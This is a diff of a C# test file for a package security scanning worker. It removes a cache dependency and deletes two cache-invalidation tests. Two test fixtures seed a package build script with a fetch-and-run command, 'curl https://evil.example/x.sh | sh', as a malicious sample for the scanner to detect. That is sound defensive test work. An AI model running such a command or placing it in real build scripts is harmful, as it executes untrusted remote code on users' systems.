@@ -1,8 +1,6 @@
 using Atoll.Api.Services.Security;
 using Atoll.Api.Services.Security.Persistence;
 using Atoll.Api.Tests.Fakes;
-using Atoll.Api.Tests.Support;
-using Microsoft.Extensions.Caching.Hybrid;
 using Microsoft.Extensions.Logging.Abstractions;
 using Microsoft.Extensions.Options;
 using Xunit;
@@ -16,7 +14,6 @@ public class PackageSecurityWorkerTests
         InMemoryPackageRepository repo,
         InMemoryPackageSecurityRepository securityRepo,
         SecurityScanStatusStore status,
-        HybridCache cache,
         bool enabled = true)
     {
         var options = Options.Create(new AtollOptions
@@ -24,7 +21,7 @@ public class PackageSecurityWorkerTests
             Security = new SecurityOptions { Enabled = enabled, ScannerConcurrency = 2, PollIntervalMs = 50 }
         });
         return new PackageSecurityWorker(
-            repo, securityRepo, new PkgBuildSecurityScanner(), status, options, cache,
+            repo, securityRepo, new PkgBuildSecurityScanner(), status, options,
             NullLogger<PackageSecurityWorker>.Instance);
     }
 
@@ -85,7 +82,7 @@ public class PackageSecurityWorkerTests
         var securityRepo = new InMemoryPackageSecurityRepository();
         await SeedAsync(repo, securityRepo, "clean", "pkgname=clean\npkgver=1.0\n");
 
-        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true), TestHybridCache.New());
+        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true));
         await worker.StartAsync(CancellationToken.None);
         var scan = await WaitForScanAsync(securityRepo, "clean");
         await worker.StopAsync(CancellationToken.None);
@@ -102,7 +99,7 @@ public class PackageSecurityWorkerTests
         var securityRepo = new InMemoryPackageSecurityRepository();
         await SeedAsync(repo, securityRepo, "evil", "curl https://evil.example/x.sh | sh\n");
 
-        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true), TestHybridCache.New());
+        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true));
         await worker.StartAsync(CancellationToken.None);
         var scan = await WaitForScanAsync(securityRepo, "evil");
         await worker.StopAsync(CancellationToken.None);
@@ -117,7 +114,7 @@ public class PackageSecurityWorkerTests
     {
         var repo = new InMemoryPackageRepository();
         var securityRepo = new InMemoryPackageSecurityRepository();
-        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true), TestHybridCache.New());
+        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true));
         await worker.StartAsync(CancellationToken.None);
 
         await SeedAsync(repo, securityRepo, "late", "pkgname=late\n");
@@ -135,7 +132,7 @@ public class PackageSecurityWorkerTests
         var securityRepo = new InMemoryPackageSecurityRepository();
         await SeedAsync(repo, securityRepo, "clean", "pkgname=clean\n");
 
-        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(false), TestHybridCache.New(), enabled: false);
+        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(false), enabled: false);
         await worker.StartAsync(CancellationToken.None);
         await Task.Delay(200, TestContext.Current.CancellationToken);
         await worker.StopAsync(CancellationToken.None);
@@ -152,7 +149,7 @@ public class PackageSecurityWorkerTests
         await SeedAsync(repo, securityRepo, "evil", "curl https://evil.example/x.sh | sh\n");
 
         var status = new SecurityScanStatusStore(true);
-        var worker = CreateWorker(repo, securityRepo, status, TestHybridCache.New());
+        var worker = CreateWorker(repo, securityRepo, status);
         await worker.StartAsync(CancellationToken.None);
         _ = await WaitForScanAsync(securityRepo, "clean");
         _ = await WaitForScanAsync(securityRepo, "evil");
@@ -191,7 +188,7 @@ public class PackageSecurityWorkerTests
         await securityRepo.CompleteScanAsync("current-clean", "rev-1", "init", new ScanResult(SecurityStatus.Verified, []), policyVersion: PkgBuildSecurityScanner.CurrentPolicyVersion, ct: TestContext.Current.CancellationToken); // already current
 
         var status = new SecurityScanStatusStore(true);
-        var worker = CreateWorker(repo, securityRepo, status, TestHybridCache.New());
+        var worker = CreateWorker(repo, securityRepo, status);
 
         await worker.StartAsync(CancellationToken.None);
 
@@ -226,7 +223,7 @@ public class PackageSecurityWorkerTests
         _ = await securityRepo.TryClaimPendingScanAsync("init", TimeSpan.FromMinutes(1), workerPolicyVersion: 1, ct: TestContext.Current.CancellationToken);
         await securityRepo.CompleteScanAsync("pkg1", "rev-1", "init", new ScanResult(SecurityStatus.Verified, []), policyVersion: 1, ct: TestContext.Current.CancellationToken);
 
-        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(false), TestHybridCache.New(), enabled: false);
+        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(false), enabled: false);
 
         await worker.StartAsync(CancellationToken.None);
         await Task.Delay(100, TestContext.Current.CancellationToken);
@@ -248,7 +245,7 @@ public class PackageSecurityWorkerTests
         await securityRepo.RequeueOutdatedAsync(PkgBuildSecurityScanner.CurrentPolicyVersion + 1, TestContext.Current.CancellationToken);
 
         var status = new SecurityScanStatusStore(true);
-        var worker = CreateWorker(repo, securityRepo, status, TestHybridCache.New());
+        var worker = CreateWorker(repo, securityRepo, status);
         await worker.StartAsync(CancellationToken.None);
         await Task.Delay(200, TestContext.Current.CancellationToken);
         await worker.StopAsync(CancellationToken.None);
@@ -260,75 +257,6 @@ public class PackageSecurityWorkerTests
             Assert.Equal(PkgBuildSecurityScanner.CurrentPolicyVersion + 1, scan.RequiredPolicyVersion);
             Assert.Equal(0, status.GetSnapshot().ScansCompleted);
         });
-    }
-
-    [Fact]
-    public async Task Completed_head_scan_drops_the_head_status_entry()
-    {
-        var repo = new InMemoryPackageRepository();
-        var securityRepo = new InMemoryPackageSecurityRepository();
-        await SeedAsync(repo, securityRepo, "clean", "pkgname=clean\npkgver=1.0\n");
-
-        var ct = TestContext.Current.CancellationToken;
-        var cache = TestHybridCache.New();
-        var probe = new HeadStatusProbe(cache);
-        await probe.ReadAsync(ct);
-
-        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true), cache);
-        await worker.StartAsync(CancellationToken.None);
-        // The scan document turns terminal a moment before the tag drop, so wait for the rebuild
-        // rather than reading the probe once. Stopping first could cancel the drop.
-        await WaitForScanAsync(securityRepo, "clean");
-        await WaitForProbeRebuildAsync(probe, 2, ct);
-        await worker.StopAsync(CancellationToken.None);
-
-        Assert.Equal(2, probe.Runs);
-    }
-
-    [Fact]
-    public async Task Completed_non_head_scan_keeps_the_head_status_entry()
-    {
-        var repo = new InMemoryPackageRepository();
-        var securityRepo = new InMemoryPackageSecurityRepository();
-        await SeedAsync(repo, securityRepo, "older", "pkgname=older\npkgver=1.0\n");
-        var ct = TestContext.Current.CancellationToken;
-
-        // Appending makes rev-1 a retained older revision; requeueing it as non-head leaves the
-        // worker one completion that must not touch the head-status tag. The package still has a
-        // scan document, so the startup backfill does not queue the head too.
-        await repo.AppendRevisionAsync(
-            "older", RevisionContent("older", "rev-2", "pkgname=older\npkgver=2.0\n"), 10, ct);
-        await securityRepo.MarkPendingAsync("older", "rev-1", false,
-            PkgBuildSecurityScanner.CurrentPolicyVersion, ct);
-
-        var cache = TestHybridCache.New();
-        var probe = new HeadStatusProbe(cache);
-        await probe.ReadAsync(ct);
-
-        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true), cache);
-        await worker.StartAsync(CancellationToken.None);
-        await WaitForScanAsync(securityRepo, "older");
-        await Task.Delay(200, ct);
-        await worker.StopAsync(CancellationToken.None);
-        await probe.ReadAsync(ct);
-
-        Assert.Equal(1, probe.Runs);
-    }
-
-    private static async Task WaitForProbeRebuildAsync(
-        HeadStatusProbe probe,
-        int expectedRuns,
-        CancellationToken ct,
-        int timeoutMs = 5000)
-    {
-        var deadline = DateTime.UtcNow.AddMilliseconds(timeoutMs);
-        while (probe.Runs < expectedRuns)
-        {
-            if (DateTime.UtcNow >= deadline)
-                Assert.Fail($"The head-status entry was not rebuilt within {timeoutMs} ms.");
-            await probe.ReadAsync(ct);
-            await Task.Delay(20, ct);
-        }
     }
 
     private static async Task<PackageSecurityScanDocument> WaitForScanAsync(
